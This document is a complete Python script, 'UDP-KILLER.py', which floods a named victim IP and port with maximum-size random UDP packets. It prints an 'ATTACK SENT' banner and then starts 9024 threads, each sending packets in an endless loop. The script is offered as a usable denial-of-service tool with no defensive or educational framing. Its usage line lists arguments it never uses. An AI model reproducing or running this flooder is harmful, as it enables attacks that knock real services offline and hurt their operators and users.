import socket

import random

import threading

import time

import sys



if len(sys.argv) != 4:

    print("Usage: python UDP-KILLER.py <ip> <port> <threads> <range>")


ip = str(sys.argv[1])

port = int(sys.argv[2])

threads = int(sys.argv[3])

print("""╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗

╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 

╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 

""")

time.sleep(1)

victim_ip = ip



def run():

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    byte_packet = (int(65500))

    byte_sock = random._urandom(byte_packet)

    sent = 0

    s.settimeout(5)

    while True:

        try:

            addr = (str(victim_ip), int(port))

            s.sendto(byte_sock,addr)

            sent += 1

        except socket.error:

             time.sleep(.1)

        except:

             pass



for _ in range(9024):

    th = threading.Thread(target=run)

    th.start()
